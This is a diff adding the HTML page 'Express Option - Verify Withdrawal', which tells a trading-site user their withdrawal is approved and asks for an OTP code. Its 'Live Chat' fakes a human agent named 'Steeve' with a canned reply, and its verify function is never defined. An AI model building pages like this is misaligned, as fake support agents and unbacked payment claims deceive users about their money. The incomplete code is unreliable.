@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Express Option - Verify Withdrawal</title>
+  <style>
+    /* === Global Styles === */
+    body {
+      margin: 0;
+      font-family: 'Poppins', sans-serif;
+      background: linear-gradient(135deg, #000000, #1a1a1a);
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      color: #fff;
+    }
+
+    .container {
+      background: #111;
+      padding: 40px;
+      border-radius: 20px;
+      box-shadow: 0 0 25px rgba(255, 140, 0, 0.3);
+      text-align: center;
+      width: 370px;
+      transition: all 0.3s ease;
+    }
+
+    .container:hover {
+      transform: scale(1.02);
+      box-shadow: 0 0 40px rgba(255, 165, 0, 0.6);
+    }
+
+    .logo {
+      font-size: 22px;
+      font-weight: bold;
+      color: #ffa500;
+      margin-bottom: 15px;
+      letter-spacing: 1px;
+    }
+
+    .highlight {
+      color: #fff;
+    }
+
+    h1 {
+      color: #ffa500;
+      font-size: 24px;
+      margin-bottom: 10px;
+    }
+
+    p {
+      color: #ccc;
+      font-size: 16px;
+      margin-bottom: 25px;
+    }
+
+    input {
+      width: 80%;
+      padding: 12px;
+      border: 2px solid #ffa500;
+      border-radius: 10px;
+      outline: none;
+      font-size: 16px;
+      text-align: center;
+      margin-bottom: 15px;
+      color: #fff;
+      background: #222;
+    }
+
+    input:focus {
+      border-color: #ff8c00;
+      box-shadow: 0 0 8px rgba(255, 165, 0, 0.5);
+    }
+
+    button {
+      padding: 12px 25px;
+      background: #ffa500;
+      color: black;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      font-size: 16px;
+      font-weight: bold;
+      transition: background 0.3s;
+    }
+
+    button:hover {
+      background: #ff8c00;
+    }
+
+    .message {
+      margin-top: 20px;
+      font-size: 18px;
+      font-weight: bold;
+      min-height: 25px;
+    }
+
+    .success {
+      color: #00ff66;
+    }
+
+    .fail {
+      color: #ff3333;
+    }
+
+    /* === Loader Animation === */
+    .loader {
+      border: 4px solid #333;
+      border-top: 4px solid #ffa500;
+      border-radius: 50%;
+      width: 25px;
+      height: 25px;
+      animation: spin 1s linear infinite;
+      display: inline-block;
+      margin-top: 10px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    /* === Live Chat === */
+    .chat-icon {
+      position: fixed;
+      bottom: 30px;
+      right: 30px;
+      background: #ffa500;
+      width: 60px;
+      height: 60px;
+      border-radius: 50%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      color: #000;
+      font-size: 30px;
+      cursor: pointer;
+      box-shadow: 0 0 20px rgba(255, 165, 0, 0.5);
+      transition: transform 0.3s, box-shadow 0.3s;
+    }
+
+    .chat-icon:hover {
+      transform: scale(1.1);
+      box-shadow: 0 0 30px rgba(255, 165, 0, 0.7);
+    }
+
+    .chat-box {
+      position: fixed;
+      bottom: 100px;
+      right: 30px;
+      background: #111;
+      border: 2px solid #ffa500;
+      border-radius: 15px;
+      width: 300px;
+      display: none;
+      flex-direction: column;
+      box-shadow: 0 0 20px rgba(255, 165, 0, 0.4);
+      overflow: hidden;
+    }
+
+    .chat-header {
+      background: #ffa500;
+      color: #000;
+      padding: 10px;
+      border-top-left-radius: 12px;
+      border-top-right-radius: 12px;
+      text-align: center;
+      font-weight: bold;
+      position: relative;
+    }
+
+    .close-chat {
+      position: absolute;
+      right: 10px;
+      top: 5px;
+      color: #000;
+      background: none;
+      border: none;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    .chat-body {
+      padding: 10px;
+      color: #fff;
+      height: 200px;
+      overflow-y: auto;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+
+    .chat-message {
+      background: #222;
+      padding: 8px 12px;
+      border-radius: 8px;
+      max-width: 80%;
+      word-wrap: break-word;
+    }
+
+    .chat-message.user {
+      background: #ffa500;
+      color: #000;
+      align-self: flex-end;
+    }
+
+    .chat-footer {
+      display: flex;
+      border-top: 1px solid #ffa500;
+    }
+
+    .chat-footer input {
+      flex: 1;
+      padding: 10px;
+      border: none;
+      outline: none;
+      background: #222;
+      color: white;
+    }
+
+    .chat-footer button {
+      background: #ffa500;
+      border: none;
+      color: black;
+      padding: 10px 15px;
+      cursor: pointer;
+      font-weight: bold;
+    }
+
+    .chat-footer button:hover {
+      background: #ff8c00;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- === Verification Section === -->
+  <div class="container">
+    <div class="logo">Express <span class="highlight">Option</span></div>
+    <h1>Withdrawal Successful</h1>
+    <p>Your withdrawal has been approved.<br>
+       Please verify your identity with the OTP code below.</p>
+
+    <input type="password" id="codeInput" placeholder="Enter OTP code">
+    <br>
+    <button onclick="checkCode()">Verify</button>
+
+    <div id="message" class="message"></div>
+  </div>
+
+  <!-- === Live Chat Icon === -->
+   <div class="chat-toggle">
+    <button class="chat-btn" id="chat-open" title="Live Chat">💬</button>
+  </div>
+
+  <div class="chat-window" id="chat-window" role="dialog" aria-hidden="true">
+    <div class="chat-header">
+      <div style="display:flex;gap:10px;align-items:center">
+        <div style="width:36px;height:36px;border-radius:8px;background:linear-gradient(135deg,var(--accent),#ffb47a);display:flex;align-items:center;justify-content:center;color:var(--bg);font-weight:800">EO</div>
+        <div>
+          <div style="color:var(--white);font-weight:800">Live Chat</div>
+          <div style="font-size:12px;color:var(--muted)">Online •</div>
+        </div>
+      </div>
+      <div style="display:flex;gap:8px;align-items:center">
+        <button style="background:transparent;border:1px solid rgba(255,255,255,0.03);padding:6px;border-radius:8px;color:var(--muted)" id="chat-minimize">_</button>
+        <button style="background:transparent;border:1px solid rgba(255,255,255,0.03);padding:6px;border-radius:8px;color:var(--muted)" id="chat-close">×</button>
+      </div>
+    </div>
+
+    <div class="chat-body" id="chat-body">
+      <div class="msg bot">Hey! 👋 How can I help you with trading or copy trading today?</div>
+    </div>
+
+    <div class="chat-input">
+      <input id="chat-input" placeholder="Type your message..." aria-label="Chat input">
+        <a  href="mailto:expressoptionofficial@gmail.com"><button class="cta" id="chat-send">Send</button></a>
+    </div>
+  </div>
+  <style>
+          :root{
+      --bg: #0b0b0b;
+      --card: #0f0f10;
+      --muted: #bdbdbd;
+      --white: #ffffff;
+      --accent: #ff7a18;
+      --accent-2: #ff9a3a;
+      --glass: rgba(255,255,255,0.03);
+      --glass-2: rgba(255,255,255,0.02);
+      font-family: Inter, "Poppins", system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+    }
+       .cta{background:linear-gradient(90deg,var(--accent),var(--accent-2));padding:9px 14px;border-radius:10px;color:var(--bg);font-weight:800;cursor:pointer}
+    .chat-toggle{position:fixed;right:20px;bottom:20px;z-index:200}
+    .chat-btn{width:64px;height:64px;border-radius:999px;background:linear-gradient(135deg,var(--accent),#ffb47a);display:flex;align-items:center;justify-content:center;box-shadow:0 10px 40px rgba(255,122,24,0.15);border:none;cursor:pointer;font-size:26px}
+    .chat-window{position:fixed;right:20px;bottom:96px;width:340px;max-height:520px;background:linear-gradient(180deg,#0d0d0d,#0b0b0b);border-radius:12px;border:1px solid rgba(255,255,255,0.03);box-shadow:0 10px 40px rgba(0,0,0,0.6);overflow:hidden;display:none;flex-direction:column}
+    .chat-header{display:flex;align-items:center;justify-content:space-between;padding:12px 14px;background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));border-bottom:1px solid rgba(255,255,255,0.02)}
+    .chat-body{padding:12px;overflow:auto;flex:1;display:flex;flex-direction:column;gap:8px}
+    .msg{max-width:78%;padding:10px;border-radius:10px}
+    .msg.user{align-self:flex-end;background:linear-gradient(90deg,var(--accent),#ff9a3a);color:var(--bg)}
+    .msg.bot{align-self:flex-start;background:rgba(255,255,255,0.02);color:var(--muted)}
+    .chat-input{display:flex;padding:10px;border-top:1px solid rgba(255,255,255,0.02);gap:8px}
+    .chat-input input{flex:1;padding:10px;border-radius:10px;border:1px solid rgba(255,255,255,0.03);background:transparent;color:var(--white)}
+  </style>
+  <script>
+   /* --- Chat logic (demo) --- */
+    const chatOpen = document.getElementById('chat-open');
+    const chatWindow = document.getElementById('chat-window');
+    const chatClose = document.getElementById('chat-close');
+    const chatMin = document.getElementById('chat-minimize');
+    const chatSend = document.getElementById('chat-send');
+    const chatBody = document.getElementById('chat-body');
+    const chatInput = document.getElementById('chat-input');
+
+    chatOpen.addEventListener('click', ()=>{ chatWindow.style.display='flex'; chatOpen.style.display='none'; scrollChat(); });
+    chatClose.addEventListener('click', ()=>{ chatWindow.style.display='none'; chatOpen.style.display='inline-flex'; });
+    chatMin.addEventListener('click', ()=>{ chatWindow.style.display='none'; chatOpen.style.display='inline-flex'; });
+
+    function appendMessage(text, from='bot'){
+      const d = document.createElement('div'); d.className='msg ' + (from==='user'?'user':'bot'); d.textContent = text; chatBody.appendChild(d); scrollChat();
+    }
+    function scrollChat(){ chatBody.scrollTop = chatBody.scrollHeight; }
+    chatSend.addEventListener('click', sendChat);
+    chatInput.addEventListener('keydown', (e)=>{ if(e.key==='Enter') sendChat(); });
+
+    function sendChat(){
+      const v = chatInput.value.trim(); if(!v) return; appendMessage(v,'user'); chatInput.value=''; setTimeout(()=>{ appendMessage('Steeve: Thanks — we received your message: "'+v+'". An agent will reply shortly.','bot'); }, 900);
+    }
+
+  </script>
+
+</body>
+</html>
